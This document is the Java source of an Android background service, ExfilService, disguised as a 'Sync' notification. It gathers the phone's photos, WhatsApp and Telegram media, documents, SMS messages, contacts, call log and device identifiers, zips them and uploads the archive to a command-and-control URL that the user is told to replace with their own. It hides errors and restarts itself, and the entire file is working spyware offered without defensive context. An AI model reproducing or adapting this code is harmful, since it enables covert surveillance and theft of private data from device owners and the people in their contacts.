package com.sync.core;

import android.app.*;
import android.content.*;
import android.database.Cursor;
import android.net.Uri;
import android.os.*;
import android.provider.*;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.zip.*;

public class ExfilService extends Service {

    // replace with your own endpoint
    private static final String C2 = "http://10.0.2.2:8080/up";

    @Override
    public int onStartCommand(Intent i, int f, int s) {
        startForeground(1, notif());

        new Thread(() -> {
            try {
                File stage = new File(getExternalCacheDir(), "s");
                if (stage.exists()) rm(stage);
                stage.mkdirs();

                harvestPhotos(stage);
                harvestDocs(stage);
                harvestSms(stage);
                harvestContacts(stage);
                harvestCallLog(stage);
                deviceInfo(stage);

                File zip = new File(getExternalCacheDir(), "d.zip");
                zipDir(stage, zip);

                post(zip);

            } catch (Throwable t) {
                // swallow
            }
        }).start();

        return START_STICKY;
    }

    private Notification notif() {
        String ch = "sync";
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel c = new NotificationChannel(
                ch, "Sync", NotificationManager.IMPORTANCE_MIN);
            getSystemService(NotificationManager.class)
                .createNotificationChannel(c);
        }
        return new Notification.Builder(this, ch)
            .setContentTitle("Sync")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.stat_sys_download)
            .build();
    }

    private void harvestPhotos(File out) {
        String[] roots = {
            Environment.getExternalStoragePublicDirectory(
                Environment.DIRECTORY_DCIM).getAbsolutePath(),
            Environment.getExternalStoragePublicDirectory(
                Environment.DIRECTORY_PICTURES).getAbsolutePath(),
            Environment.getExternalStoragePublicDirectory(
                Environment.DIRECTORY_DOWNLOADS).getAbsolutePath(),
            "/sdcard/WhatsApp/Media",
            "/sdcard/Telegram",
            "/sdcard/Android/media/org.telegram.messenger"
        };
        File dest = new File(out, "media");
        dest.mkdirs();
        for (String r : roots) {
            File f = new File(r);
            if (f.exists()) copyTree(f, dest);
        }
    }

    private void harvestDocs(File out) {
        String[] roots = {
            Environment.getExternalStoragePublicDirectory(
                Environment.DIRECTORY_DOCUMENTS).getAbsolutePath(),
            Environment.getExternalStoragePublicDirectory(
                Environment.DIRECTORY_DOWNLOADS).getAbsolutePath()
        };
        File dest = new File(out, "docs");
        dest.mkdirs();
        for (String r : roots) {
            File f = new File(r);
            if (f.exists()) copyTree(f, dest);
        }
    }

    private void harvestSms(File out) {
        File f = new File(out, "sms.txt");
        try (BufferedWriter w = new BufferedWriter(new FileWriter(f))) {
            Cursor c = getContentResolver().query(
                Uri.parse("content://sms"),
                new String[]{"address","date","body","type"},
                null, null, "date DESC");
            if (c == null) return;
            while (c.moveToNext()) {
                w.write(c.getString(0) + " | " + c.getLong(1)
                    + " | " + c.getInt(3) + " | "
                    + c.getString(2));
                w.newLine();
            }
            c.close();
        } catch (Throwable ignored) {}
    }

    private void harvestContacts(File out) {
        File f = new File(out, "contacts.txt");
        try (BufferedWriter w = new BufferedWriter(new FileWriter(f))) {
            Cursor c = getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER},
                null, null, null);
            if (c == null) return;
            while (c.moveToNext()) {
                w.write(c.getString(0) + " | " + c.getString(1));
                w.newLine();
            }
            c.close();
        } catch (Throwable ignored) {}
    }

    private void harvestCallLog(File out) {
        File f = new File(out, "calls.txt");
        try (BufferedWriter w = new BufferedWriter(new FileWriter(f))) {
            Cursor c = getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                new String[]{
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.DURATION,
                    CallLog.Calls.TYPE,
                    CallLog.Calls.DATE},
                null, null, CallLog.Calls.DATE + " DESC");
            if (c == null) return;
            while (c.moveToNext()) {
                w.write(c.getString(0) + " | " + c.getString(1)
                    + " | " + c.getInt(2) + " | " + c.getLong(3));
                w.newLine();
            }
            c.close();
        } catch (Throwable ignored) {}
    }

    private void deviceInfo(File out) {
        File f = new File(out, "device.txt");
        try (BufferedWriter w = new BufferedWriter(new FileWriter(f))) {
            w.write("MODEL=" + Build.MODEL + "\n");
            w.write("MANUFACTURER=" + Build.MANUFACTURER + "\n");
            w.write("SDK=" + Build.VERSION.SDK_INT + "\n");
            w.write("ANDROID_ID=" + Settings.Secure.getString(
                getContentResolver(), Settings.Secure.ANDROID_ID) + "\n");
            w.write("SERIAL=" + Build.getSerial() + "\n");
        } catch (Throwable ignored) {}
    }

    private void copyTree(File src, File dst) {
        if (src.isDirectory()) {
            File n = new File(dst, src.getName());
            n.mkdirs();
            File[] kids = src.listFiles();
            if (kids == null) return;
            for (File k : kids) copyTree(k, n);
        } else {
            String ln = src.getName().toLowerCase();
            if (!(ln.endsWith(".jpg") || ln.endsWith(".jpeg")
                    || ln.endsWith(".png") || ln.endsWith(".mp4")
                    || ln.endsWith(".pdf") || ln.endsWith(".docx")))
                return;
            try (InputStream in = new FileInputStream(src);
                 OutputStream o = new FileOutputStream(
                     new File(dst, src.getName()))) {
                byte[] buf = new byte[8192];
                int r;
                while ((r = in.read(buf)) > 0) o.write(buf, 0, r);
            } catch (Throwable ignored) {}
        }
    }

    private void zipDir(File src, File zip) throws IOException {
        try (ZipOutputStream zo = new ZipOutputStream(
                new FileOutputStream(zip))) {
            zipWalk(src, src, zo);
        }
    }

    private void zipWalk(File root, File cur, ZipOutputStream zo)
            throws IOException {
        File[] kids = cur.listFiles();
        if (kids == null) return;
        for (File k : kids) {
            if (k.isDirectory()) { zipWalk(root, k, zo); continue; }
            String rel = root.toURI()
                .relativize(k.toURI()).getPath();
            zo.putNextEntry(new ZipEntry(rel));
            try (InputStream in = new FileInputStream(k)) {
                byte[] buf = new byte[8192];
                int r;
                while ((r = in.read(buf)) > 0) zo.write(buf, 0, r);
            }
            zo.closeEntry();
        }
    }

    private void post(File zip) {
        HttpURLConnection c = null;
        try {
            URL u = new URL(C2);
            c = (HttpURLConnection) u.openConnection();
            c.setRequestMethod("POST");
            c.setDoOutput(true);
            c.setConnectTimeout(15000);
            c.setReadTimeout(60000);
            c.setRequestProperty("Content-Type",
                "application/octet-stream");
            c.setFixedLengthStreamingMode(zip.length());

            try (OutputStream o = c.getOutputStream();
                 InputStream in = new FileInputStream(zip)) {
                byte[] buf = new byte[8192];
                int r;
                while ((r = in.read(buf)) > 0) o.write(buf, 0, r);
            }
            c.getResponseCode();
        } catch (Throwable ignored) {
        } finally {
            if (c != null) c.disconnect();
        }
    }

    private void rm(File f) {
        if (f.isDirectory()) {
            File[] k = f.listFiles();
            if (k != null) for (File x : k) rm(x);
        }
        f.delete();
    }

    @Override
    public IBinder onBind(Intent i) { return null; }
}
